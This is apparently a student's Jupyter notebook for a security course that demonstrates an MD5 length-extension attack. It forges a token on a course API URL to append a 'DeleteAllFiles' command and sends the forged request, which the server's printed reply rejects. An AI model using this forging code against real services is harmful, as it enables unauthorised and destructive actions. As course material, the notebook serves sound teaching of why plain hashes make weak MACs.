{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pymd5 import md5, padding"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "1.1 - Experiment with Length Extension"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "3ecc68efa1871751ea9b0b1a5b25004d\n"
     ]
    }
   ],
   "source": [
    "m = b\"Use HMAC, not hashes\"\n",
    "h = md5()\n",
    "h.update(m)\n",
    "print(h.hexdigest())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "bits = int(len(m) + len(padding(len(m)*8))) * 8"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "h = md5(\n",
    "    state=bytes.fromhex(\"3ecc68efa1871751ea9b0b1a5b25004d\"),\n",
    "    count=bits)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "e1ca9db8eae1b8cbfacc63de828af6d0\n"
     ]
    }
   ],
   "source": [
    "suffix = b\"Good advice\"\n",
    "h.update(suffix)\n",
    "print(h.hexdigest())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "e1ca9db8eae1b8cbfacc63de828af6d0\n"
     ]
    }
   ],
   "source": [
    "mystr = m + padding(len(m)*8) + suffix\n",
    "h=md5()\n",
    "h.update(mystr)\n",
    "print(h.hexdigest())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "1.2 - Conduct Length Extension Attack"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#https://csci3403.com/proj1/api?token=1e755d78dcb4d783b2573b8d04fcc48a&user=admin&command1=ListFiles&command2=NoOp\n",
    "\n",
    "tokenstr = password + \"user=admin&command1=ListFiles&command2=NoOp\"\n",
    "h = md5()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "d037150d6ddc74fff8db6e4d6d5bbf28\n",
      "https://csci3403.com/proj1/api?token=d037150d6ddc74fff8db6e4d6d5bbf28&user=admin&command1=ListFiles&command2=NoOp&command3=DeleteAllFiles\n",
      "b'<strong>Error:</strong> Invalid token for command: user=admin&command1=ListFiles&command2=NoOp&command3=DeleteAllFiles'\n"
     ]
    }
   ],
   "source": [
    "import http.client \n",
    "import urllib.parse \n",
    "import sys\n",
    "\n",
    "#if len(sys.argv) != 2:\n",
    "#print('Requires the URL to extend as a command line argument.') exit(1)\n",
    "#original_url = sys.argv[1]\n",
    "original_url = \"https://csci3403.com/proj1/api?token=1e755d78dcb4d783b2573b8d04fcc48a&user=admin&command1=ListFiles&command2=NoOp\"\n",
    "\n",
    "# Your code to modify url goes here \n",
    "length = 8 + len(\"user=admin&command1=ListFiles&command2=NoOp\")\n",
    "token_hex = \"1e755d78dcb4d783b2573b8d04fcc48a\"\n",
    "bits = int(length+len(padding(length*8))) * 8\n",
    "\n",
    "h = md5(\n",
    "    state=bytes.fromhex(token_hex),\n",
    "    count=bits)\n",
    "\n",
    "suffix = b\"&command3=DeleteAllFiles\"\n",
    "h.update(suffix)\n",
    "\n",
    "newtoken = h.hexdigest()\n",
    "print(newtoken)\n",
    "new_url = \"https://csci3403.com/proj1/api?token=\" + str(newtoken) + \"&user=admin&command1=ListFiles&command2=NoOp&command3=DeleteAllFiles\"\n",
    "print(new_url)\n",
    "# The following code requests the URL and returns the response from the server\n",
    "parsed_url = urllib.parse.urlparse(new_url)\n",
    "conn = http.client.HTTPSConnection(parsed_url.hostname, parsed_url.port)\n",
    "conn.request(\"GET\", parsed_url.path + \"?\" + parsed_url.query)\n",
    "print(conn.getresponse().read())\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
